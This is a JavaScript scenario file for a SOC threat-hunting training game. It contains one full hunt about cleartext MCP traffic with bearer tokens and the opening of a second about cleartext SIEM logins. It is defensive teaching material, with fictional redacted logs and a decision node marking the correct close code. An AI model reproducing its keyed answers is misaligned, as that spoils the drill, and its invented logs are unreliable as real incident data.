/**
 * Threat hunt as code — scenario registry.
 *
 * Each entry is the entire game content for one hunt: the engine in
 * threat-hunt.js reads this shape (contract documented in
 * docs/threat-hunt-mud/ThreatHunt.d.ts) and renders it. To author a new
 * hunt, copy an entry, keep the shape, change the content, and push it
 * onto this array — no engine change needed.
 *
 * Narration voice follows the system register: third person, present
 * tense, no direct references to the player, numbers first, no
 * exclamation marks. Containment actions use the fixed vocabulary
 * (Acknowledge / Isolate / Allow / Block / Escalate / Dismiss) unless
 * the hunt substitutes BH close codes at the decision node.
 */
window.THREAT_HUNTS = [
  {
    "id": "fakecorp-cleartext-mcp",
    "meta": {
      "title": "Cleartext MCP, FAKE CORP asset",
      "briefing": "Alert A-4418 is open: cleartext HTTP from 10.44.18.72 to cloud vendor ranges, 289 requests across 7 distinct /…/mcp paths in a 90m window (16:42–18:12), including a full security-tooling stack. Corp-looking DNS and MDM can explain the asset without clearing the exposure. The correct BH close code is the goal. Target: under 3 minutes.",
      "targetSeconds": 180
    },
    "glossary": {
      "MCP": "A simple way for an AI or app to plug into other tools (like a universal adapter). Here those tools are security products.",
      "cleartext": "Sent with no encryption — anyone on the path can read it, like a postcard instead of a sealed letter.",
      "HTTP": "The basic language of the web. Alone (without TLS) it is not private.",
      "TLS": "The lock on a web connection (the S in HTTPS). \"No TLS\" means the traffic is not locked.",
      "DNS": "The phone book of the internet: turns names like fakecorp.example into addresses computers dial.",
      "MDM": "Company device management — software that enrolls and controls a laptop or phone for IT.",
      "SSID": "The Wi-Fi network name shown in the client list (for example the training lab network).",
      "VLAN": "A sliced-off piece of the network, like a separate hallway in the same building.",
      "EDR": "Endpoint security software that watches a computer for suspicious behavior.",
      "JSON-RPC": "A simple ask-and-answer message format apps use to call functions over the network.",
      "endpoint": "A device or service on the network that can send or receive traffic — here, the source host.",
      "Pivot": "Jump to another log source using what is already found — follow the breadcrumb.",
      "tool listings": "The menu of actions an MCP server says it can do — including whether those actions can change data.",
      "cloud vendor ranges": "Blocks of internet addresses that belong to big cloud providers (not the conference Wi-Fi itself).",
      "security-orchestration": "Wiring many security tools together so one client can drive several of them.",
      "security stack": "The set of security products in use — detection, intel, identity, and similar tools.",
      "BH close code": "How Black Hat SOC marks why an alert was closed — the official label for the outcome.",
      "True Positive": "Real bad or real impact that needed incident response. The alert was right and serious.",
      "False Positive": "The alert was wrong — it looked bad but the detection was a mistake.",
      "BH Benign": "Something that looked alarming but is allowed here (for example sanctioned class traffic).",
      "IR": "Incident response — the people and steps used when something real needs handling now.",
      "close code": "The final label on an alert that says what kind of finding it turned out to be.",
      "resolver": "The DNS server that answers \"what address is this name?\" for clients on the network.",
      "auth material": "Secrets used to prove identity — tokens, keys, or passwords. Bad to send in the clear."
    },
    "startNode": "observed-logs",
    "nodes": {
      "observed-logs": {
        "name": "Observed traffic",
        "tag": "[zeek]",
        "narration": "A-4418 · High · Cleartext MCP · 10.44.18.72 → cloud vendor ranges · HTTP (no TLS) · 289 requests, 7 MCP paths across a 90m window (first sample 16:42:46, last sample 18:12:13). Paths include /vaultwatch/mcp, /talon/mcp, /redline-intel/mcp, /graph-ti/mcp, /pulsefeed/mcp, /badgeauth/mcp, /notekeep/mcp.",
        "evidence": [
          {
            "id": "ev-cleartext-stack",
            "label": "cleartext · 7 MCP paths",
            "detail": "Unencrypted HTTP carries a complete security-orchestration client surface, not a single health check.",
            "hint": [
              "dst port 80",
              "paths=7"
            ]
          }
        ],
        "exits": [
          {
            "to": "http-conn",
            "label": "Inspect the HTTP sessions"
          },
          {
            "to": "dns-logs",
            "label": "Pivot to resolver logs"
          },
          {
            "to": "device-profile",
            "label": "Profile the source host"
          }
        ],
        "logs": [
          {
            "id": "log-observed-logs",
            "title": "corelight_http_raw · URI rollup",
            "lines": [
              "# corelight_http_raw · cleartext MCP URI rollup · src 10.44.18.72 · dst port 80",
              " hits  methods       uri",
              "   53  GET,POST      /redline-intel/mcp",
              "   50  GET,POST      /pulsefeed/mcp",
              "   50  GET,POST      /notekeep/mcp",
              "   49  GET,POST      /graph-ti/mcp",
              "   48  GET,POST      /talon/mcp",
              "   23  GET,POST      /vaultwatch/mcp",
              "   16  POST          /badgeauth/mcp",
              "  289  TOTAL        paths=7"
            ]
          }
        ]
      },
      "http-conn": {
        "name": "HTTP sessions",
        "tag": "[http]",
        "narration": "Session bodies stay in the clear: JSON-RPC style MCP calls, tool listings, and auth material in headers. Destinations resolve into cloud vendor ranges. One client reaches vault, EDR, threat-intel, graph TI, pulse feed, badge auth, and note-keep MCP servers across the 90m window. Timed samples start with a three-path burst at 16:42:46, an initialize to graph-ti at 17:15:48, and a talon session still active at 18:12:13.",
        "evidence": [
          {
            "id": "ev-live-stack",
            "label": "live stack · auth material on wire",
            "detail": "Cleartext MCP sessions carry a live security-orchestration client surface with auth material in headers on port 80.",
            "hint": [
              "Authorization=Bearer mcpk_[REDACTED]",
              "id.resp_p=80"
            ]
          }
        ],
        "exits": [
          {
            "to": "dns-logs",
            "label": "Pivot to resolver logs"
          },
          {
            "to": "device-profile",
            "label": "Profile the source host"
          },
          {
            "to": "observed-logs",
            "label": "Return to observed traffic"
          }
        ],
        "logs": [
          {
            "id": "log-http-hint",
            "title": "HINT · corelight_http_raw · cleartext auth on :80",
            "lines": [
              "# Hint from the wire (obfuscated from live Corelight http rows)",
              "# Same shape the hunt thread called out: MCP in the clear to cloud vendor ranges + full security stack",
              "id.orig_h=10.44.18.72",
              "id.resp_p=80",
              "version=HTTP/1.1",
              "tls=absent",
              "host=mcp-alb.cloud-vendor.example",
              "Authorization=Bearer mcpk_[REDACTED]",
              "uri_set=/vaultwatch/mcp,/talon/mcp,/redline-intel/mcp,/graph-ti/mcp,/pulsefeed/mcp,/badgeauth/mcp,/notekeep/mcp",
              "user_agent=agent-cli/2.1.220 (cli)",
              "note=Bearer MCP API key in client_headers on cleartext port 80 to a multi-product security MCP ALB",
              "",
              "# Example row (fields compacted)",
              "{\"_path\":\"http\",\"id.orig_h\":\"10.44.18.72\",\"id.resp_h\":\"203.0.113.12\",\"id.resp_p\":80,\"method\":\"GET\",\"host\":\"mcp-alb.cloud-vendor.example\",\"uri\":\"/talon/mcp\",\"status_code\":200,\"user_agent\":\"agent-cli/2.1.220 (cli)\",\"client_headers\":{\"Host\":\"mcp-alb.cloud-vendor.example\",\"Authorization\":\"Bearer mcpk_[REDACTED]\",\"Accept\":\"text/event-stream\",\"mcp-protocol-version\":\"2025-11-25\"}}",
              "{\"_path\":\"http\",\"id.orig_h\":\"10.44.18.72\",\"id.resp_h\":\"203.0.113.14\",\"id.resp_p\":80,\"method\":\"GET\",\"host\":\"mcp-alb.cloud-vendor.example\",\"uri\":\"/graph-ti/mcp\",\"status_code\":200,\"client_headers\":{\"Authorization\":\"Bearer mcpk_[REDACTED]\"}}",
              "{\"_path\":\"http\",\"id.orig_h\":\"10.44.18.72\",\"id.resp_h\":\"203.0.113.11\",\"id.resp_p\":80,\"method\":\"GET\",\"host\":\"mcp-alb.cloud-vendor.example\",\"uri\":\"/redline-intel/mcp\",\"status_code\":200,\"client_headers\":{\"Authorization\":\"Bearer mcpk_[REDACTED]\"}}"
            ]
          },
          {
            "id": "log-http-conn",
            "title": "corelight_http_raw · additional session samples",
            "lines": [
              "# corelight_http_raw · session samples (secrets redacted, identities fiction)",
              "id.orig_h=10.44.18.72",
              "id.resp_p=80",
              "version=HTTP/1.1",
              "host=mcp-alb.cloud-vendor.example",
              "Authorization=Bearer mcpk_[REDACTED]",
              "uri_set=/vaultwatch/mcp,/talon/mcp,/redline-intel/mcp,/graph-ti/mcp,/pulsefeed/mcp,/badgeauth/mcp,/notekeep/mcp",
              "user_agent=agent-cli/2.1.220 (cli)",
              "",
              "# Timed session samples (chronological · secrets redacted, identities fiction)",
              "---",
              "{\"_path\":\"http\",\"ts\":\"2026-08-01T16:42:46.417367Z\",\"uid\":\"Cfict0000001\",\"id.orig_h\":\"10.44.18.72\",\"id.resp_h\":\"203.0.113.15\",\"id.resp_p\":80,\"method\":\"POST\",\"host\":\"mcp-alb.cloud-vendor.example\",\"uri\":\"/pulsefeed/mcp\",\"status_code\":200,\"user_agent\":\"agent-cli/2.1.220 (cli)\"}",
              "client_headers={\"Host\":\"mcp-alb.cloud-vendor.example\",\"Authorization\":\"Bearer mcpk_[REDACTED]\",\"Content-Type\":\"application/json\",\"Accept\":\"application/json, text/event-stream\",\"User-Agent\":\"agent-cli/2.1.220 (cli)\",\"mcp-protocol-version\":\"2025-11-25\"}",
              "post_body={\"method\":\"resources/list\",\"jsonrpc\":\"2.0\",\"id\":3}",
              "post_reply=event: message\r\ndata: {\"jsonrpc\":\"2.0\",\"id\":3,\"result\":{\"resources\":[]}}\r\n\r\n",
              "---",
              "{\"_path\":\"http\",\"ts\":\"2026-08-01T16:42:46.497267Z\",\"uid\":\"Cfict0000002\",\"id.orig_h\":\"10.44.18.72\",\"id.resp_h\":\"203.0.113.13\",\"id.resp_p\":80,\"method\":\"POST\",\"host\":\"mcp-alb.cloud-vendor.example\",\"uri\":\"/notekeep/mcp\",\"status_code\":200,\"user_agent\":\"agent-cli/2.1.220 (cli)\"}",
              "client_headers={\"Host\":\"mcp-alb.cloud-vendor.example\",\"Authorization\":\"Bearer mcpk_[REDACTED]\",\"Content-Type\":\"application/json\",\"Accept\":\"application/json, text/event-stream\",\"User-Agent\":\"agent-cli/2.1.220 (cli)\",\"mcp-protocol-version\":\"2025-11-25\"}",
              "post_body={\"method\":\"prompts/list\",\"jsonrpc\":\"2.0\",\"id\":2}",
              "post_reply=event: message\r\ndata: {\"jsonrpc\":\"2.0\",\"id\":2,\"result\":{\"prompts\":[]}}\r\n\r\n",
              "---",
              "{\"_path\":\"http\",\"ts\":\"2026-08-01T16:42:46.501729Z\",\"uid\":\"Cfict0000003\",\"id.orig_h\":\"10.44.18.72\",\"id.resp_h\":\"203.0.113.11\",\"id.resp_p\":80,\"method\":\"POST\",\"host\":\"mcp-alb.cloud-vendor.example\",\"uri\":\"/redline-intel/mcp\",\"status_code\":200,\"user_agent\":\"agent-cli/2.1.220 (cli)\"}",
              "client_headers={\"Host\":\"mcp-alb.cloud-vendor.example\",\"Authorization\":\"Bearer mcpk_[REDACTED]\",\"Content-Type\":\"application/json\",\"Accept\":\"application/json, text/event-stream\",\"User-Agent\":\"agent-cli/2.1.220 (cli)\",\"mcp-protocol-version\":\"2025-11-25\"}",
              "post_body={\"method\":\"resources/list\",\"jsonrpc\":\"2.0\",\"id\":3}",
              "post_reply=event: message\r\ndata: {\"jsonrpc\":\"2.0\",\"id\":3,\"result\":{\"resources\":[]}}\r\n\r\n",
              "---",
              "{\"_path\":\"http\",\"ts\":\"2026-08-01T17:15:48.190159Z\",\"uid\":\"Cfict0000004\",\"id.orig_h\":\"10.44.18.72\",\"id.resp_h\":\"203.0.113.14\",\"id.resp_p\":80,\"method\":\"POST\",\"host\":\"mcp-alb.cloud-vendor.example\",\"uri\":\"/graph-ti/mcp\",\"status_code\":200,\"user_agent\":\"-\"}",
              "client_headers={\"Host\":\"mcp-alb.cloud-vendor.example\",\"Authorization\":\"Bearer mcpk_[REDACTED]\",\"Content-Type\":\"application/json\",\"Accept\":\"application/json, text/event-stream\",\"User-Agent\":\"-\",\"mcp-protocol-version\":\"2025-11-25\"}",
              "post_body={\"jsonrpc\":\"2.0\",\"id\":0,\"method\":\"initialize\",\"params\":{\"protocolVersion\":\"2025-06-18\",\"capabilities\":{\"elicitation\":{\"form\":{},\"url\":{}}},\"clientInfo\":{\"name\":\"lab-mcp-client\",\"title\":\"LabMCP\",\"version\":\"0.146.0-alpha.3.1\"}}}",
              "post_reply=event: message\r\ndata: {\"jsonrpc\":\"2.0\",\"id\":0,\"result\":{\"protocolVersion\":\"2025-06-18\",\"capabilities\":{\"experimental\":{},\"prompts\":{\"listChanged\":false},\"resources\":{\"subscribe\":false,\"listChanged\":fa",
              "---",
              "{\"_path\":\"http\",\"ts\":\"2026-08-01T18:12:13.361926Z\",\"uid\":\"Cfict0000005\",\"id.orig_h\":\"10.44.18.72\",\"id.resp_h\":\"203.0.113.12\",\"id.resp_p\":80,\"method\":\"GET\",\"host\":\"mcp-alb.cloud-vendor.example\",\"uri\":\"/talon/mcp\",\"status_code\":200,\"user_agent\":\"agent-cli/2.1.220 (cli)\"}",
              "client_headers={\"Host\":\"mcp-alb.cloud-vendor.example\",\"Authorization\":\"Bearer mcpk_[REDACTED]\",\"Content-Type\":\"application/json\",\"Accept\":\"application/json, text/event-stream\",\"User-Agent\":\"agent-cli/2.1.220 (cli)\",\"mcp-protocol-version\":\"2025-11-25\"}",
              "",
              "# tools/list samples · cleartext JSON-RPC (listing bodies truncated in sensor · untimed)",
              "---",
              "uri=/vaultwatch/mcp method=POST status=200 dst_port=80",
              "post_body={\"jsonrpc\":\"2.0\",\"id\":1,\"method\":\"tools/list\",\"params\":{\"_meta\":{\"progressToken\":0}}}",
              "post_reply={\"id\":1,\"jsonrpc\":\"2.0\",\"result\":{\"tools\":[{\"annotations\":{\"readOnlyHint\":true},\"description\":\"Retrieves a single case by its resource name.\\n\\nFetches all details for a specific case, including its p…",
              "---",
              "uri=/notekeep/mcp method=POST status=200 dst_port=80",
              "post_body={\"method\":\"tools/list\",\"jsonrpc\":\"2.0\",\"id\":1}",
              "post_reply=event: message\r\ndata: {\"jsonrpc\":\"2.0\",\"id\":1,\"result\":{\"tools\":[{\"name\":\"validate_query\",\"description\":\"Validate an NoteKeep DSL query string before running it.\\n\\n    Args:\\n        query: The DSL s…",
              "---",
              "uri=/talon/mcp method=POST status=200 dst_port=80",
              "post_body={\"jsonrpc\":\"2.0\",\"id\":1,\"method\":\"tools/list\",\"params\":{\"_meta\":{\"progressToken\":0}}}",
              "post_reply=event: message\r\ndata: {\"jsonrpc\":\"2.0\",\"id\":1,\"result\":{\"tools\":[{\"name\":\"talon_check_connectivity\",\"description\":\"Check connectivity to the Talon API for all configured CIDs.\",\"inputSchema\":{\"prope…"
            ]
          }
        ]
      },
      "dns-logs": {
        "name": "Resolver logs",
        "tag": "[dns-01]",
        "narration": "Resolver window for 10.44.18.72 shows fakecorp-mdm.example, badgeauth.fakecorp.example, collab.fakecorp.example, and several cloud vendor names (including mcp-alb.cloud-vendor.example). Query mix matches a managed FAKE CORP endpoint on the conference training VLAN. Corp-looking DNS is normal for that asset class; it does not clear the cleartext MCP exposure.",
        "evidence": [
          {
            "id": "ev-dns-corp",
            "label": "DNS · fakecorp.* pattern",
            "detail": "Name resolution looks like a managed FAKE CORP endpoint. Normal for the asset class; not a close code by itself.",
            "hint": [
              "fakecorp"
            ]
          }
        ],
        "exits": [
          {
            "to": "device-profile",
            "label": "Profile the source host"
          },
          {
            "to": "class-context",
            "label": "Search class traffic"
          },
          {
            "to": "http-conn",
            "label": "Inspect the HTTP sessions"
          },
          {
            "to": "observed-logs",
            "label": "Return to observed traffic"
          }
        ],
        "logs": [
          {
            "id": "log-dns-logs",
            "title": "dns · corp-looking names (context, not closure)",
            "lines": [
              "# dns · top queries for 10.44.18.72 — corp identity pattern from the hunt thread",
              " hits  query",
              "  6600  _kerberos._tcp.fakecorp.example",
              "  6548  _kerberos._udp.fakecorp.example",
              "  1984  dlp.fakecorp.example",
              "  1280  fakecorp-mdm.example",
              "   606  collab.fakecorp.example",
              "   480  edr.fakecorp.example",
              "   200  badgeauth.fakecorp.example",
              "   101  mcp-alb.cloud-vendor.example",
              "    62  pulsefeed.cloud-vendor.example",
              "    26  cspm.cloud-vendor.example",
              "note=Corp DNS/MDM explains the asset. It does not clear cleartext bearer MCP on :80."
            ]
          }
        ]
      },
      "device-profile": {
        "name": "Device profile",
        "tag": "[asset]",
        "narration": "Host identity: FAKECORP-L4P · managed enterprise browser · enrolled at fakecorp-mdm.example. Org label FAKE CORP. An open endpoint on the conference network with FAKE CORP MDM signals; provenance beyond that is not established here.",
        "evidence": [
          {
            "id": "ev-managed",
            "label": "managed endpoint · FAKE CORP MDM",
            "detail": "Source presents as a managed FAKE CORP endpoint. Identity explains the DNS pattern; it does not sanction cleartext security-stack MCP on the floor.",
            "hint": [
              "mdm=fakecorp-mdm.example",
              "org=FAKE CORP"
            ]
          }
        ],
        "exits": [
          {
            "to": "class-context",
            "label": "Search class traffic"
          },
          {
            "to": "dns-logs",
            "label": "Pivot to resolver logs"
          },
          {
            "to": "http-conn",
            "label": "Inspect the HTTP sessions"
          },
          {
            "to": "observed-logs",
            "label": "Return to observed traffic"
          }
        ],
        "logs": [
          {
            "id": "log-device-profile",
            "title": "asset profile",
            "lines": [
              "# asset profile · 10.44.18.72 (obfuscated from live host identity)",
              "hostname=FAKECORP-L4P",
              "os=macOS",
              "mdm=fakecorp-mdm.example",
              "org=FAKE CORP",
              "browser=managed enterprise browser",
              "edr=present",
              "network=conference training VLAN",
              "note=MDM/DNS explain identity; they do not sanction cleartext security-stack MCP"
            ]
          }
        ]
      },
      "class-context": {
        "name": "Class traffic",
        "tag": "[ops]",
        "narration": "Training VLAN and exploit-lab SSID samples in the same window show no peer hosts enumerating the same cleartext MCP security stack. Pattern is unique to 10.44.18.72, not shared class traffic.",
        "evidence": [
          {
            "id": "ev-not-class",
            "label": "no class peers · not lab SSID",
            "detail": "Sanctioned training MCP would show peers on the lab SSID. This host is alone; BH Benign does not fit.",
            "hint": [
              "peers_matching=0"
            ]
          }
        ],
        "exits": [
          {
            "to": "decision",
            "label": "Move to close codes",
            "requiresEvidence": 4
          },
          {
            "to": "device-profile",
            "label": "Return to device profile"
          },
          {
            "to": "dns-logs",
            "label": "Pivot to resolver logs"
          }
        ],
        "logs": [
          {
            "id": "log-class-context",
            "title": "peer search",
            "lines": [
              "# peer search · same window · cleartext MCP path set",
              "query=uri in (/vaultwatch/mcp,/talon/mcp,/redline-intel/mcp,/graph-ti/mcp,/pulsefeed/mcp,/badgeauth/mcp,/notekeep/mcp)",
              "             and id.resp_p=80 and id.orig_h != 10.44.18.72",
              "scope=training VLAN + exploit-lab SSID samples",
              "peers_matching=0",
              "note=pattern unique to 10.44.18.72"
            ]
          }
        ]
      },
      "decision": {
        "name": "Close codes",
        "tag": "[decision]",
        "narration": "Evidence covers the 289-request cleartext MCP rollup, bearer auth on port 80, corp DNS/MDM identity, and zero class peers on the same path set. Corp signals explain the asset without clearing the exposure. One BH close code fits.",
        "isDecision": true,
        "actions": [
          {
            "id": "true-positive",
            "label": "True Positive",
            "correct": true,
            "resultNote": "Cleartext exposure of a live security-orchestration MCP stack with auth material on the conference network is a confirmed incident that requires escalation and IR. Close True Positive."
          },
          {
            "id": "false-positive",
            "label": "False Positive",
            "resultNote": "False Positive fits a wrong detector assertion. The HTTP sessions and MCP paths are real; the alert was not a product failure."
          },
          {
            "id": "bh-benign",
            "label": "BH Benign",
            "resultNote": "BH Benign fits sanctioned or non-hostile class traffic. No lab-SSID peers share this MCP stack; MDM signals alone do not make cleartext security-stack MCP acceptable."
          }
        ]
      }
    },
    "endings": {
      "win": {
        "title": "Closed True Positive",
        "narration": "A-4418 closed True Positive. On-site IR contacts the FAKE CORP asset owner; cleartext MCP client traffic is treated as a live security-stack exposure. Handover notes the path set and source 10.44.18.72."
      },
      "lose": {
        "title": "Wrong close code",
        "narration": "The queue records the chosen close code against evidence that still shows a live cleartext security-stack exposure outside class sanction. The correct first close is below."
      },
      "timeout": {
        "title": "Window closed",
        "narration": "The queue moved on before a close code landed. The evidence trail remains below for review."
      }
    },
    "timeline": [
      {
        "id": "tl-dns-hum",
        "t": "16:41:00",
        "label": "corp DNS pattern resolving in the background (all-window)",
        "nodes": [
          "dns-logs"
        ],
        "hint": [
          "_kerberos._tcp.fakecorp.example",
          "fakecorp-mdm.example"
        ],
        "tone": "info"
      },
      {
        "id": "tl-burst",
        "t": "16:42:46",
        "label": "three MCP servers enumerated within one second",
        "nodes": [
          "http-conn"
        ],
        "hint": [
          "16:42:46"
        ],
        "tone": "warn"
      },
      {
        "id": "tl-initialize",
        "t": "17:15:48",
        "label": "client initialize handshake to graph-ti",
        "nodes": [
          "http-conn"
        ],
        "hint": [
          "17:15:48"
        ],
        "tone": "info"
      },
      {
        "id": "tl-talon",
        "t": "18:12:13",
        "label": "talon session still active at end of the 90m sample window",
        "nodes": [
          "http-conn"
        ],
        "hint": [
          "18:12:13"
        ],
        "tone": "info"
      },
      {
        "id": "tl-alert",
        "t": "18:14:00",
        "label": "A-4418 opens on the 289-request cleartext MCP rollup",
        "nodes": [
          "observed-logs"
        ],
        "hint": [
          "paths=7",
          "289"
        ],
        "tone": "critical"
      }
    ]
  },
  {
    "id": "northlab-cleartext-siem-login",
    "meta": {
      "title": "Cleartext SIEM login, classroom VLAN",
      "briefing": "Alert A-5521 is open: cleartext HTTP from 10.44.22.11 to a cloud VPS, LogDeck SIEM UI login paths, credentials from 3 distinct usernames in an 8m window (18:41–18:49) visible on the wire. Source sits on a Malware Traffic Lab classroom VLAN. Cleartext classroom tooling can be ugly without being an intrusion. The correct BH close code is the goal. Target: under 3 minutes.",
      "targetSeconds": 180
    },
    "glossary": {
      "SIEM": "A search box over security logs — like a library catalog for network and host events.",
      "LogDeck": "A fictional classroom SIEM product name used in this drill (stands in for a real log UI).",
      "cleartext": "Sent with no encryption — anyone on the path can read it, like a postcard instead of a sealed letter.",
      "HTTP": "The basic language of the web. Alone (without TLS) it is not private.",
      "TLS": "The lock on a web connection (the S in HTTPS). \"No TLS\" means the traffic is not locked.",
      "VLAN": "A sliced-off piece of the network, like a separate hallway in the same building.",
      "cloud VPS": "A rented virtual server on the public internet, not a conference lab appliance.",
      "classroom VLAN": "The network slice assigned to a training room — peers here often share class tooling.",
      "credentials": "Login secrets (username and password). Bad to send in the clear.",
      "Pivot": "Jump to another log source using what is already found — follow the breadcrumb.",
      "BH close code": "How Black Hat SOC marks why an alert was closed — the official label for the outcome.",
      "True Positive": "Real bad or real impact that needed incident response. The alert was right and serious.",
      "False Positive": "The alert was wrong — it looked bad but the detection was a mistake.",
      "BH Benign": "Something that looked alarming but is allowed here (for example sanctioned class traffic).",
      "close code": "The final label on an alert that says what kind of finding it turned out to be.",
      "IR": "Incident response — the people and steps used when something real needs handling now.",
      "login paths": "The web URLs used to sign into a service — here, the SIEM account pages.",
      "peer hosts": "Other devices on the same classroom network doing similar traffic.",
      "Zeek": "A network monitor that turns packets into searchable connection and protocol logs."
    },
    "startNode": "observed-logs",
    "nodes": {
      "observed-logs": {
        "name": "Observed traffic",
        "tag": "[zeek]",
        "narration": "A-5521 · High · Cleartext SIEM login · 10.44.22.11 → cloud VPS · HTTP (no TLS) · port 8001 · 3 distinct usernames in an 8m window (first sample 18:41:29, last sample 18:49:37). URIs include /en-GB/account/login and /en-GB/logdeckd/__raw/services/appsbrowser/account:login. Source VLAN label: Malware Traffic Lab.",
        "evidence": [
          {
            "id": "ev-cleartext-login",
            "label": "cleartext · SIEM login paths",
            "detail": "Unencrypted HTTP carries LogDeck account login traffic from a classroom VLAN host to a cloud VPS.",
            "hint": [
              "dst_port=8001",
              "usernames=3"
            ]
          }
        ],
        "exits": [
          {
            "to": "http-login",
            "label": "Inspect the login sessions"
          },
          {
            "to": "dest-context",
            "label": "Profile the destination"
          },
          {
            "to": "class-peers",
            "label": "Search class peer traffic"
          }
        ],
        "logs": [
          {
            "id": "log-observed-logs",
            "title": "corelight_http_raw · cleartext SIEM login rollup",
            "lines": [
              "# corelight_http_raw · cleartext SIEM login rollup · src 10.44.22.11 · dst port 8001",
              "# window for the three distinct-username login posts: 18:41:29–18:49:37 (~8m)",
              " hits  methods  status  uri",
              "    1  POST     200     /en-GB/account/login",
              "    1  POST     403     /en-GB/logdeckd/__raw/services/appsbrowser/account:login",
              "    1  POST     200     /en-GB/logdeckd/__raw/services/appsbrowser/account:login",
              "    3  TOTAL   usernames=3  dst_port=8001  tls=absent"
            ]
          }
        ]
      },
      "http-login": {
        "name": "Login sessions",
        "tag": "[http]",
        "narration": "Session bodies stay in the clear: username and password fields for labadmin (200), instructor+lab@northlab.example (403), and course-feed (200). Three distinct usernames, credentials readable on the wire across 18:41:29–18:49:37. Destinations resolve into cloud VPS address space, not a conference appliance.",
        "evidence": [
          {
            "id": "ev-creds-clear",
            "label": "credentials in clear · 3 usernames",
            "detail": "Login secrets are visible in cleartext HTTP. The exposure is real; the close code still depends on whether the SIEM is sanctioned class tooling.",
            "hint": [
              "password=[REDACTED]",
              "id.resp_p=8001"
            ]
          }
        ],
        "exits": [
          {
            "to": "dest-context",
            "label": "Profile the destination"
          },
          {
            "to": "class-peers",
            "label": "Search class peer traffic"
          },
          {
            "to": "observed-logs",
            "label": "Return to observed traffic"
          }
        ],
        "logs": [
          {
            "id": "log-http-hint",
            "title": "HINT · corelight_http_raw · cleartext credentials on :8001",
            "lines": [
              "# Hint from the wire (obfuscated from live Corelight http rows)",
              "# Same shape the hunt thread called out: SIEM UI login in the clear to a cloud VPS",
              "id.orig_h=10.44.22.11",
              "id.resp_h=203.0.113.40",
              "id.resp_p=8001",
              "version=HTTP/1.1",
              "tls=absent",
              "server=LogDeckd",
              "host=logdeck-lab.cloud-vps.example",
              "uri_set=/en-GB/account/login,/en-GB/logdeckd/__raw/services/appsbrowser/account:login",
              "usernames=labadmin,course-feed,instructor+lab@northlab.example",
              "password=[REDACTED]",
              "user_agent=Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/150.0 Safari/537.36",
              "note=username+password form fields in cleartext POST bodies on port 8001 to a cloud VPS LogDeck UI",
              "",
              "# Example rows (fields compacted · secrets redacted)",
              "{\"_path\":\"http\",\"id.orig_h\":\"10.44.22.11\",\"id.resp_h\":\"203.0.113.40\",\"id.resp_p\":8001,\"method\":\"POST\",\"host\":\"logdeck-lab.cloud-vps.example\",\"uri\":\"/en-GB/account/login\",\"status_code\":200,\"server\":\"LogDeckd\",\"user_agent\":\"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/150.0 Safari/537.36\"}",
              "post_body=cval=1458296129&username=labadmin&password=[REDACTED]&return_to=%2Fen-GB%2F&set_has_logged_in=false",
              "{\"_path\":\"http\",\"id.orig_h\":\"10.44.22.11\",\"id.resp_h\":\"203.0.113.40\",\"id.resp_p\":8001,\"method\":\"POST\",\"uri\":\"/en-GB/logdeckd/__raw/services/appsbrowser/account:login\",\"status_code\":403,\"server\":\"LogDeckd\"}",
              "post_body=username=instructor%2Blab%40northlab.example&password=[REDACTED]"
            ]
          },
          {
            "id": "log-http-login",
            "title": "corelight_http_raw · timed login samples",
            "lines": [
              "# corelight_http_raw · timed login samples (secrets redacted, identities fiction)",
              "id.orig_h=10.44.22.11",
              "id.resp_p=8001",
              "version=HTTP/1.1",
              "tls=absent",
              "server=LogDeckd",
              "host=logdeck-lab.cloud-vps.example",
              "",
              "# Timed credential posts (chronological · three distinct usernames in ~8m)",
              "---",
              "{\"_path\":\"http\",\"ts\":\"2026-08-04T18:41:29.352254Z\",\"uid\":\"Cfict0000101\",\"id.orig_h\":\"10.44.22.11\",\"id.resp_h\":\"203.0.113.40\",\"id.resp_p\":8001,\"method\":\"POST\",\"host\":\"logdeck-lab.cloud-vps.example\",\"uri\":\"/en-GB/account/login\",\"status_code\":200,\"server\":\"LogDeckd\",\"user_agent\":\"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/150.0 Safari/537.36\"}",
              "post_body=cval=1458296129&username=labadmin&password=[REDACTED]&return_to=%2Fen-GB%2F&set_has_logged_in=false",
              "---",
              "{\"_path\":\"http\",\"ts\":\"2026-08-04T18:45:07.728056Z\",\"uid\":\"Cfict0000102\",\"id.orig_h\":\"10.44.22.11\",\"id.resp_h\":\"203.0.113.40\",\"id.resp_p\":8001,\"method\":\"POST\",\"host\":\"logdeck-lab.cloud-vps.example\",\"uri\":\"/en-GB/logdeckd/__raw/services/appsbrowser/account:login\",\"status_code\":403,\"server\":\"LogDeckd\"}",
              "post_body=username=instructor%2Blab%40northlab.example&password=[REDACTED]",
              "---",
              "{\"_path\":\"http\",\"ts\":\"2026-08-04T18:49:37.842350Z\",\"uid\":\"Cfict0000103\",\"id.orig_h\":\"10.44.22.11\",\"id.resp_h\":\"203.0.113.40\",\"id.resp_p\":8001,\"method\":\"POST\",\"host\":\"logdeck-lab.cloud-vps.example\",\"uri\":\"/en-GB/logdeckd/__raw/services/appsbrowser/account:login\",\"status_code\":200,\"server\":\"LogDeckd\"}",
              "post_body=username=course-feed&password=[REDACTED]"
            ]
          }
        ]
      },
      "dest-context": {
        "name": "Destination profile",
        "tag": "[asset]",
        "narration": "Cloud VPS listener on 8001 presents a LogDeck web UI (server=LogDeckd). Post-login URI crumbs reference LogDeck_Security_Essentials and logdeck_app_for_logdeck_o11y_cloud. Pattern matches a temporary SIEM stood up for training, not a corporate production tenant. Staging for class does not by itself prove the login traffic is sanctioned.",
        "evidence": [
          {
            "id": "ev-class-tooling",
            "label": "LogDeck · class tooling signals",
            "detail": "Destination looks like a short-lived classroom SIEM with security-lab app packs. Context for BH Benign; not a close without peer confirmation.",
            "hint": [
              "LogDeck_Security_Essentials",
              "server=LogDeckd"
            ]
          }
        ],
        "exits": [
          {
            "to": "class-peers",
            "label": "Search class peer traffic"
          },
          {
            "to": "http-login",
            "label": "Inspect the login sessions"
          },
          {
            "to": "observed-logs",
            "label": "Return to observed traffic"
          }
        ],
        "logs": [
          {
            "id": "log-dest-context",
            "title": "destination profile · LogDeck class tooling crumbs",
            "lines": [
              "# destination profile · 203.0.113.40:8001 (obfuscated from live http rows)",
              "id.resp_h=203.0.113.40",
              "id.resp_p=8001",
              "server=LogDeckd",
              "host=logdeck-lab.cloud-vps.example",
              "tls=absent",
